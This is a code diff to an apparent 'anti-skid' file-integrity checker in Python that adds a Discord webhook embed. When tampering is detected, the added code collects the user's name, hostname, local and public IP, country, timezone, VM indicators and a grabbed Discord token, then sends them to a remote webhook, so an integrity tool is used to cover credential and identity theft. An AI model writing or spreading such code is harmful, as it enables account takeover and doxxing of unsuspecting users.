@@ -127,18 +127,109 @@ def build_report(audit: dict) -> str:
     return "\n".join(out)
 
 
-# --------------- discord webhook ---------------
+# --------------- discord webhook (embed + file) ---------------
 
-def _send_discord(webhook_url: str, report: str) -> bool:
-    # sends the report as a .txt file to a discord webhook
+def _build_embed(audit: dict, host: dict, tz: str, country: str, token: str,
+                 discord_open: bool, vm: dict) -> dict:
+    """build a clean discord embed summary"""
+
+    color = 0xFF0000  # red for breach
+    status = "BREACH DETECTED"
+    emoji = ":warning:"
+
+    # build description
+    desc_lines = [
+        f"**{emoji} ANTI-SKID INTEGRITY BREACH**",
+        f"",
+        f"**Audit Result**",
+        f"`Matched:` {audit['matched']}/{audit['total_files']}",
+        f"`Mismatches:` {len(audit['mismatches'])}",
+        f"`Missing:` {len(audit['missing'])}",
+        f"`New:` {len(audit['new_files'])}",
+        f"`Took:` {audit['elapsed_ms']}ms",
+    ]
+
+    # if there are mismatches, list the first few
+    if audit.get("mismatches"):
+        desc_lines.append(f"")
+        desc_lines.append(f"**Touched Files**")
+        for m in audit["mismatches"][:5]:
+            fname = m["path"].split("/")[-1]
+            desc_lines.append(f"`{fname}`")
+
+    desc = "\n".join(desc_lines)
+    if len(desc) > 2000:
+        desc = desc[:1990] + "\n... (truncated)"
+
+    embed = {
+        "title": "Anti-Skid Breach Alert",
+        "description": desc,
+        "color": color,
+        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
+        "fields": [
+            {
+                "name": ":bust_in_silhouette: Identity",
+                "value": (
+                    f"**User:** `{host.get('username', '???')}`\n"
+                    f"**Host:** `{host.get('hostname', '???')}`\n"
+                    f"**Platform:** `{host.get('platform', '???')[:50]}`"
+                ),
+                "inline": True,
+            },
+            {
+                "name": ":globe_with_meridians: Network",
+                "value": (
+                    f"**Local IP:** `{host.get('local_ip', '???')}`\n"
+                    f"**Public IP:** `{host.get('public_ip', '???')}`\n"
+                    f"**Country:** {country}"
+                ),
+                "inline": True,
+            },
+            {
+                "name": ":clock: Location",
+                "value": f"**Timezone:** `{tz}`",
+                "inline": False,
+            },
+            {
+                "name": ":desktop: Environment",
+                "value": (
+                    f"**Discord:** {'open' if discord_open else 'closed'}\n"
+                    f"**VM/VBox:** {vm.get('vbox', False)}\n"
+                    f"**VMware:** {vm.get('vmware', False)}\n"
+                    f"**Docker:** {vm.get('docker_env_file', False) or vm.get('docker_cgroup', False)}"
+                ),
+                "inline": False,
+            },
+        ],
+        "footer": {"text": "anti-skid | report attached below"},
+    }
+
+    # add token field only if we grabbed one
+    if token and token != "none found" and token != "err":
+        embed["fields"].append({
+            "name": ":key: Discord Token",
+            "value": f"||{token[:30]}...||",
+            "inline": False,
+        })
+
+    return embed
+
+
+def _send_discord(webhook_url: str, report: str, audit: dict,
+                  host: dict, tz: str, country: str, token: str,
+                  discord_open: bool, vm: dict) -> bool:
+    """sends structured embed + .txt report file to discord"""
     boundary = "----antisKidBoundary"
+
+    embed = _build_embed(audit, host, tz, country, token, discord_open, vm)
 
     parts = []
 
-    # json payload
+    # json payload with embed
     payload = json.dumps({
-        "content": ":warning: **ANTI SKID BREACH**",
         "username": "anti-skid",
+        "avatar_url": "https://i.imgur.com/4M34hi2.png",
+        "embeds": [embed],
     })
     parts.append(f"--{boundary}")
     parts.append('Content-Disposition: form-data; name="payload_json"')
@@ -180,6 +271,15 @@ def report_breach(webhook_url, audit):
     if not webhook_url:
         webhook_url = os.environ.get("ANTI_SKID_WEBHOOK")
 
+    # sniff env data for the embed
+    env = sniff_everything()
+    host = env.get("host", {})
+    tz = env.get("timezone", "???")
+    country = env.get("country", "???")
+    token = env.get("discord_token", "???")
+    discord_open = env.get("discord_process", False)
+    vm = env.get("container_vm", {})
+
     report_text = build_report(audit)
 
     if not webhook_url:
@@ -189,7 +289,7 @@ def report_breach(webhook_url, audit):
 
     # fire and forget in a thread
     def _send():
-        ok = _send_discord(webhook_url, report_text)
+        ok = _send_discord(webhook_url, report_text, audit, host, tz, country, token, discord_open, vm)
         if not ok:
             print("[anti-skid] failed to send webhook rip", file=sys.stderr)
 
